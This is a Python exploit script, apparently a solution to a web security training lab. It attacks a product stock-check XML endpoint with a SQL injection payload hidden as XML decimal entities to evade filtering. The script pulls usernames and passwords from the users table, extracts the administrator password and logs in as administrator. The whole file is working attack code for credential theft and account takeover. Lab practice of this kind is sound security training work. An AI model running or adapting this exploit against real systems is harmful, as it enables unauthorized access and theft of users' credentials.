#!/usr/bin/env python3

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {"https": "https://127.0.0.1:8080", "http": "http://127.0.0.1:8080"}

PATH = "/product/stock"

# extract data. payload is <@dec_entities>1 UNION SELECT username || ':' || password FROM users</@dec_entities> converted in Burp using Hackvertor
def extract_data(url):
    payload = "&#49;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#58;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;"
    headers = {"Content-Type": "application/xml"}
    data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{payload}</storeId></stockCheck>'
    r = requests.post(url + PATH, data=data, headers=headers, verify=False)
    for line in r.text.splitlines():
        if "administrator:" in line:
            admin_password = line.split(":")[1].strip()
            print(f"[+] The administrator password is: {admin_password}")
            return admin_password
    return None

# grab csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/login", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf

# login as admin
def admin_login(s, url, admin_password):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "administrator", "password": admin_password}
    r = s.post(url + "/login", data=data, verify=False)
    res = r.text
    if "Log out" in res:
        return True
    return False        

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit()
    url = sys.argv[1].strip()
    s = requests.Session()

    admin_password = extract_data(url)
    if not admin_password:
        print("[-] No administrator password found")
        sys.exit()

    print("[+] Success")

    

    if admin_login(s, url, admin_password):
        print("[+] Successfully logged in")
    else:
        print("[-] Login failed")        


if __name__ == "__main__":
    main()

